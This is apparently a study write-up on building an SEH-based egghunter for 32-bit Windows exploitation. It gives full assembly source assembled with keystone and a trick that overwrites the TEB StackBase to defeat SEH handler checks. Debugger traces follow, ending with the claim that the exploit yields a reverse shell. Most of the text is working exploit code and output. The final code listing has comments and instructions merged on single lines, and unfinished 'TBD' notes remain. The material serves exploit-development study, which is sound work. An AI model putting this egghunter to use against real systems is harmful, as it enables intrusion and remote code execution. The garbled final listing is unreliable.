When doing the classical egghunter shellcode, we observed that the NtAccessCheckAndAuditAlarm function did not work because the system call number was changed between Windows versions.
We fixed this by changing the system call number, but this fix comes at the cost of portability. In order for our exploit to work, we would have to identify the Windows version beforehand to craft a proper exploit.

In this case, we are going to make an egghunter that does not use the NtAccessCheckAndAuditAlarm function (remember that we used this function in order to **check in a safe way if we have right access to the memory**, as this function handles errors) and we are going to **handle the error** manually when checking if the memory region is accessible. This way, we won't depend on this system call and we won't need to have specific SSNs depending on the Windows versions.

The downside to this mechanism is that the egghunter requires additional assembly instructions **in order to set up the SEH mechanism**- the original egghunter was around 35 bytes whereas this egghunter is 60 bytes. However, it is still smaller than a normal shellcode and it can help if we have space.

Let's analyze the code of this SEH-based egghunter:
```python
from keystone import *  
CODE = (  
" start: "  
 # jump to a negative call to dynamically  
 # obtain egghunter position
 " jmp get_seh_address ;"  
" build_exception_record: "  
 # pop the address of the exception_handler  
 # into ecx
 " pop ecx ;"  
 # mov signature into eax  
" mov eax, 0x74303077 ;"  
 # push Handler of the  
 # _EXCEPTION_REGISTRATION_RECORD structure
 " push ecx ;"  
 # push Next of the  
 # _EXCEPTION_REGISTRATION_RECORD structure
 " push 0xffffffff ;"  
 # null out ebx  
" xor ebx, ebx ;"  
 # overwrite ExceptionList in the TEB with a pointer  
 # to our new _EXCEPTION_REGISTRATION_RECORD structure
 " mov dword ptr fs:[ebx], esp ;"  
" is_egg: "  
 # push 0x02  
" push 0x02 ;"  
 # pop the value into ecx which will act  
 # as a counter
 " pop ecx ;"  
 # mov memory address into edi  
" mov edi, ebx ;"  
 # check for our signature, if the page is invalid we  
 # trigger an exception and jump to our exception_handler function
 " repe scasd ;"  
 # if we didn't find signature, increase ebx  
 # and repeat
 " jnz loop_inc_one ;"  
 # we found our signature and will jump to it  
" jmp edi ;"  
" loop_inc_page: "  
 # if page is invalid the exception_handler will  
 # update eip to point here and we move to next page
 " or bx, 0xfff ;"  
" loop_inc_one: "  
 # increase ebx by one byte  
" inc ebx ;"  
 # check for signature again  
" jmp is_egg ;"  
" get_seh_address: "  
 # call to a higher address to avoid null bytes & push  
 # return to obtain egghunter position
 " call build_exception_record ;"  
 # push 0x0c onto the stack  
" push 0x0c ;"  
 # pop the value into ecx  
" pop ecx ;"  
 # mov into eax the pointer to the CONTEXT  
 # structure for our exception
 " mov eax, [esp+ecx] ;"  
 # mov 0xb8 into ecx which will act as an  
 # offset to the eip
 " mov cl, 0xb8 ;"  
 # increase the value of eip by 0x06 in our CONTEXT  
 # so it points to the "or bx, 0xfff" instruction 
 # to increase the memory page
 " add dword ptr ds:[eax+ecx], 0x06 ;"  
 # save return value into eax  (IF YOU ANALYZE THIS DEEPLY YOU WILL FIND THAT THE ADDRESS OF PUSH 0x0C is on top of the stack, so doing a pop will store it)
" pop eax ;"  
 # increase esp to clean the stack for our call  
" add esp, 0x10 ;"  
 # push return value back into the stack  
" push eax ;"  
 # null out eax to simulate  
 # ExceptionContinueExecution return
 " xor eax, eax ;"  
 # return  
" ret ;"  
)  
# Initialize engine in X86-32bit mode  
ks = Ks(KS_ARCH_X86, KS_MODE_32)
```

The code starts by executing a JMP instruction to a later part in the code, the `get_seh_address` label.
In this label, the first instruction is a **relative CALL** to the `build_exception_record` function.
When executing a **relative call, the opcodes will match the offset from the current value of EIP.** This would generate opcodes, but, as we are calling a **function that is declared previosly in the code, the offset is negative, and we are doing a backward call, so there are not nullbytes as the offset is negative.** That is why we declare our `build_exception_record` **after** in the code (Note: we learnt that the disposition of the labels **is very important when doing shellcode!**).
Also, as we are doing a **call** operation, the return address is stored in the stack (the CALL instruction does that) so that the program knows where to continue after the `build_exception_record` function has finished. 
The `build_exception_record` function starts by popping the return value (which has just been stored in the stack, and represents the location of our egghunter) into the ecx register.
Then, the egg signature (0x74303077, t00w in little endian, remember that to store numbers and strings we have to store them in little endian) is moved to the eax register.
Then, we are going to add the two values of the `_EXCEPTION_REGISTRATION_RECORD` structure in the stack, as we want to build our own `_EXCEPTION_REGISTRATION_RECORD`. We push our return address pointing to the next instruction after our CALL instruction (this is the value of the push 0x0c instruction) as the "Handler" member of the `_EXCEPTION_REGISTRATION_RECORD` structure, and then we push the value of "-1" (0xffffffff) as our Next member. This signals **that this registration record is tha last one, as there is no next member!**. The OS won't search for more handlers after this one.
Then, we overwrite the **first exception handler** (that is pointed by `fs:[0]`) by nulling ebx, and putting the value of `fs[ebx]` to the values on the top of the stack. Wow! We just pushed both values of the `_EXCEPTION_REGISTRATION_RECORD` in the top of the stack! This basically overwrites the first exception handler for our custom one.
The next functions (is_egg, loop_inc_page, and loop_inc_one) are meant to search for our egg in memory. They are similar to the previous egghunter, but rather than executing the SCASD operation twice, we use the **REPE** instruction with the counter stored in ECX. This is done to minimize the size of the egghunter.
Given that we do not use any system call to check if a memory page is mapped or if we can access it, the access violation will be triggered on the REPE SCASD instruction. This will raise an exception that **will trigger our custom handler**. We want **that our exception handler restores execution at the `loop_inc_page` function**, which will move on to the next memory page and repeat the search.

During a previous module, we explored the prototype of the `_except_handler` function, the function of our handler:
```c
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) ( 
IN PEXCEPTION_RECORD ExceptionRecord,
IN VOID EstablisherFrame,
IN OUT PCONTEXT ContextRecord,
IN OUT PDISPATCHER_CONTEXT DispatcherContext );
```

When an exception is triggered, the OS will call our custom "Handler" function, passing these four parameters into the stack.
Therefore, these 4 parameters will be in the stack and we will be able to manipulate them.
The interesting parameter is the third parameter, the `PCONTEXT` parameter, which points to a CONTEXT structure:

```c
0:009> dt ntdll!_CONTEXT
   +0x000 ContextFlags     : Uint4B
   +0x004 Dr0              : Uint4B
   +0x008 Dr1              : Uint4B
   +0x00c Dr2              : Uint4B
   +0x010 Dr3              : Uint4B
   +0x014 Dr6              : Uint4B
   +0x018 Dr7              : Uint4B
   +0x01c FloatSave        : _FLOATING_SAVE_AREA
   +0x08c SegGs            : Uint4B
   +0x090 SegFs            : Uint4B
   +0x094 SegEs            : Uint4B
   +0x098 SegDs            : Uint4B
   +0x09c Edi              : Uint4B
   +0x0a0 Esi              : Uint4B
   +0x0a4 Ebx              : Uint4B
   +0x0a8 Edx              : Uint4B
   +0x0ac Ecx              : Uint4B
   +0x0b0 Eax              : Uint4B
   +0x0b4 Ebp              : Uint4B
   +0x0b8 Eip              : Uint4B // INTERESTING
   +0x0bc SegCs            : Uint4B
   +0x0c0 EFlags           : Uint4B
   +0x0c4 Esp              : Uint4B
   +0x0c8 SegSs            : Uint4B
   +0x0cc ExtendedRegisters : [512] UChar
```

This structure contains the processor register data at the time the exception occurred.
At the moment the exception occurs, all register values are stored in this structure. At offset 0x0b8 from the beginning of this structure, we find the EIP member. This member stores **the memory address pointing to the instruction that caused the access violation.**
This member is an important part of the egghunter resuming execution. **Because we can modify this structure as part of our custom `_except_handler` implementation,** we can also resume the execution flow at the `_loop_inc_page` function to move to the next memory page.

Our handler also needs to take care of the return value, in EAX. The result of the handler comes in the form of an `_EXCEPTION_DISPOSITION` structure containing four members, each of them acting as a return value:
```c
0:006> dt _EXCEPTION_DISPOSITION
ntdll!_EXCEPTION_DISPOSITION
ExceptionContinueExecution = 0n0
ExceptionContinueSearch = 0n1
ExceptionNestedException = 0n2
ExceptionCollidedUnwind = 0n3
```
Therefore, to continue the execution, this value must be 0x00, to signal that the exception has been successfully handled, so that when the exception is triggered and our function is executed, we return to the `_loop_inc_page` value and continue the execution, in a loop.

So at the memory address of the "Handler" (our returning point to manage the exception) must:
- Retrieve the `ContextRecord` parameter which has been pushed to the stack, as well as the other 3 parameters.
- Obtain the EIP member adding 0xB8 to the offset of `ContextRecord`.
- We modify the value of this EIP member to the `loop_inc_page` memory address offset.
- We save this value in EAX as we want to return to this address.
- Reduce the stack size to clear the 4 arguments that are not needed anymore. We already got the EIP value and added the offset, and stored this value in EAX.
- Push the EAX (address we want to return, which is the address of push 0x0c) into the stack.
- Null out EAX to signal the OS that the exception has been managed ( `ExceptionContinueExecution`)
- Perform a `ret` instruction to return to the `loop_inc_page` function.

The `ret` at the end of our shellcode would return to the address of the push 0x0c instruction but as EAX is 0, the return address is not used and the EIP from the CONTEXT parameter in the stack is used to set up EIP. As we modified EIP to go to the add+1 page and continue searching, we repeat the search process again and again.

**TBD: I think that you can put any address in the top of the stack before using the `ret` instruction as the return address will never be used. EIP from the CONTEXT variable will be used.**

Next, this won't work at all. The following checks over our SEH handler will be performed:
1. The memory address of our _EXCEPTION_REGISTRATION_RECORD structure needs to be higher than the StackLimit. 
2. The memory address of our _EXCEPTION_REGISTRATION_RECORD structure plus 0x08 needs to be lower than the StackBase. 
3. The memory address of our _EXCEPTION_REGISTRATION_RECORD structure needs to be aligned to the four bytes boundary. 
4. The memory address of our _except_handler function needs to be located at a higher address than the StackBase.

The three first ones are OK, as we created a `EXCEPTION_REGISTRATION_RECORD` structure in the stack, so it is between the StackLimit and StackBase and will meet those conditions always.
But our custom function is also inside the stack, and condition 4 tries to check if it is located at a higher memory address than the StackBase. This check is implemented because the stack is only supposed to contain data. Functions can read or write to it but the stack is not supposed to contain executable code. 
How do we manage to execute our function then?
Well, we have modified the field of the TEB corresponding to the address of the first handler to be executed.
Why don't we modify the value of the StackBase field of the TEB to be lower than the address of our `_except_handler` function, but higher than the value of our `_EXCEPTION_REGISTRATION_RECORD` structure?

The egghunter already gathered the address of the `except_handler` function dinamically, so we could substract a small number of bytes from it (not much, so the StackBase is still higher than our `_EXCEPTION_REGISTRATION_RECORD` structure) and use that to overwrite the StackBase value.
This is what is updated in the egghunter:
```python
# overwrite ExceptionList in the TEB with a pointer 
# to our new _EXCEPTION_REGISTRATION_RECORD structure 
" mov dword ptr fs:[ebx], esp ;" 
# subtract 0x04 from the pointer
# to exception_handler 
" sub ecx, 0x04 ;" 
# add 0x04 to ebx 
" add ebx, 0x04 ;" 
# overwrite the StackBase in the TEB to the address -4, which is in ECX
# this way, Stackbase will be lower than our except_handler function!
" mov dword ptr fs:[ebx], ecx ;"
```

Now the verification is done. Remember that this module does not have SafeSEH so we don't need to bypass it, but it would be another protection to bypass.

The final SEH egghunter would be this one:
```python
from keystone import *  
CODE = (  
" start: "  
 # jump to a negative call to dynamically  
 # obtain egghunter position" jmp get_seh_address ;"  
" build_exception_record: "  
 # pop the address of the exception_handler  
 # into ecx" pop ecx ;"  
 # mov signature into eax  
" mov eax, 0x74303077 ;"  
 # push Handler of the  
 # _EXCEPTION_REGISTRATION_RECORD structure" push ecx ;"  
 # push Next of the  
 # _EXCEPTION_REGISTRATION_RECORD structure" push 0xffffffff ;"  
 # null out ebx  
" xor ebx, ebx ;"  
 # overwrite ExceptionList in the TEB with a pointer  
 # to our new _EXCEPTION_REGISTRATION_RECORD structure" mov dword ptr fs:[ebx], esp ;"  
# subtract 0x04 from the pointer (address) to exception_handler  
" sub ecx, 0x04 ;" # add 0x04 to ebx so it points to TEB StackBase field instead of the first element of TEB  
" add ebx, 0x04 ;"  
 # overwrite the StackBase in the TEB  
" mov dword ptr fs:[ebx], ecx ;" " is_egg: "  
 # push 0x02  
" push 0x02 ;"  
 # pop the value into ecx which will act  
 # as a counter" pop ecx ;"  
 # mov memory address into edi  
" mov edi, ebx ;"  
 # check for our signature, if the page is invalid we  
 # trigger an exception and jump to our exception_handler function" repe scasd ;"  
 # if we didn't find signature, increase ebx  
 # and repeat" jnz loop_inc_one ;"  
 # we found our signature and will jump to it  
" jmp edi ;"  
" loop_inc_page: "  
 # if page is invalid the exception_handler will  
 # update eip to point here and we move to next page" or bx, 0xfff ;"  
" loop_inc_one: "  
 # increase ebx by one byte  
" inc ebx ;"  
 # check for signature again  
" jmp is_egg ;"  
" get_seh_address: "  
 # call to a higher address to avoid null bytes & push  
 # return to obtain egghunter position" call build_exception_record ;"  
 # push 0x0c onto the stack  
" push 0x0c ;"  
 # pop the value into ecx  
" pop ecx ;"  
 # mov into eax the pointer to the CONTEXT  
 # structure for our exception" mov eax, [esp+ecx] ;"  
 # mov 0xb8 into ecx which will act as an  
 # offset to the eip" mov cl, 0xb8 ;"  
 # increase the value of eip by 0x06 in our CONTEXT  
 # so it points to the "or bx, 0xfff" instruction # to increase the memory page" add dword ptr ds:[eax+ecx], 0x06 ;"  
 # save return value into eax  
" pop eax ;"  
 # increase esp to clean the stack for our call  
" add esp, 0x10 ;"  
 # push return value back into the stack  
" push eax ;"  
 # null out eax to simulate  
 # ExceptionContinueExecution return" xor eax, eax ;"  
 # return  
" ret ;"  
)  
# Initialize engine in 32bit mode  
ks = Ks(KS_ARCH_X86, KS_MODE_32)  
encoding, count = ks.asm(CODE)  
egghunter = ""  
for dec in encoding:  
 egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n")  
  
print("egghunter = (\"" + egghunter + "\")")
```

After checking no null bytes, append the egghunter instead of the classical egghunter and send the exploit. You should get a reverse shell:

```c
0:009> !teb
TEB at 00399000
    ExceptionList:        022dff60
    StackBase:            022e0000
    StackLimit:           022dc000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 00399000
    EnvironmentPointer:   00000000
    ClientId:             000012e0 . 00001904
    RpcHandle:            00000000
    Tls Storage:          00000000
    PEB Address:          0038f000
    LastErrorValue:       0
    LastStatusValue:      0
    Count Owned Locks:    0
    HardErrorMode:        0

// NO CUSTOM HANDLERS. EXCEPTION GOING TO BE HANDLED WITH DEFAULT HANDLER.
0:009> dt _EXCEPTION_REGISTRATION_RECORD 022dff60
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x022dffcc _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x77ae8b10     _EXCEPTION_DISPOSITION  ntdll!_except_handler4+0

0:009> g
(12e0.1d20): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=74303077 ebx=00000004 ecx=00000002 edx=77ae2da0 esi=001b5868 edi=00000004
eip=04f1eab3 esp=04f1ea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
04f1eab3 f3af            repe scas dword ptr es:[edi]

0:004> !teb
TEB at 00394000
    ExceptionList:        04f1ea1c
    StackBase:            04f1eac2
    StackLimit:           04f1c000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 00394000
    EnvironmentPointer:   00000000
    ClientId:             000012e0 . 00001d20
    RpcHandle:            00000000
    Tls Storage:          0064a0e0
    PEB Address:          0038f000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0

0:004> dt _EXCEPTION_REGISTRATION_RECORD 04f1ea1c
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0xffffffff _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x04f1eac6     _EXCEPTION_DISPOSITION  +4f1eac6

0:004> BP 0x04f1eac6     

0:004> g
Breakpoint 1 hit
eax=00000000 ebx=00000000 ecx=04f1eac6 edx=77af6270 esi=00000000 edi=00000000
eip=04f1eac6 esp=04f1e4c0 ebp=04f1e4e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
04f1eac6 6a0c            push    0Ch

0:004> u eip L10
04f1eac6 6a0c            push    0Ch
04f1eac8 59              pop     ecx
04f1eac9 8b040c          mov     eax,dword ptr [esp+ecx]
04f1eacc b1b8            mov     cl,0B8h
04f1eace 83040806        add     dword ptr [eax+ecx],6
04f1ead2 58              pop     eax
04f1ead3 83c410          add     esp,10h
04f1ead6 50              push    eax
04f1ead7 31c0            xor     eax,eax
04f1ead9 c3              ret

0:004> bp 0x04f1ead9

0:004> g
Breakpoint 2 hit
eax=00000000 ebx=00000000 ecx=000000b8 edx=77af6270 esi=00000000 edi=00000000
eip=04f1ead9 esp=04f1e4d0 ebp=04f1e4e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
04f1ead9 c3              ret

0:004> u 04f1e4d0 
04f1e4d0 52              push    edx
04f1e4d1 62af771ceaf1    bound   ebp,qword ptr [edi-0E15E389h]
04f1e4d7 0470            add     al,70h
04f1e4d9 62af771ceaf1    bound   ebp,qword ptr [edi-0E15E389h]
04f1e4df 04a8            add     al,0A8h
04f1e4e1 e5f1            in      eax,0F1h
04f1e4e3 0424            add     al,24h
04f1e4e5 62af77c0e5f1    bound   ebp,qword ptr [edi-0E1A3F89h]

0:004> t
eax=00000000 ebx=00000000 ecx=000000b8 edx=77af6270 esi=00000000 edi=00000000
eip=77af6252 esp=04f1e4d4 ebp=04f1e4e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!ExecuteHandler2+0x26:
77af6252 648b2500000000  mov     esp,dword ptr fs:[0] fs:003b:00000000=04f1e4d4
TBD DECIR QUE DESPUES DEL RET NO HEMOS IDO A 04f1ead9 SINO A ntdll!ExecuteHandler2+0x26 y que esto acaba volviendo a buscar en nuestra memoria o si encuentra el code nos da la shell

0:004> g
(12e0.1d20): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=74303077 ebx=00001000 ecx=00000002 edx=77ae2da0 esi=001b5868 edi=00001000
eip=04f1eab3 esp=04f1ea1c ebp=41414141 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010216
04f1eab3 f3af            repe scas dword ptr es:[edi]


```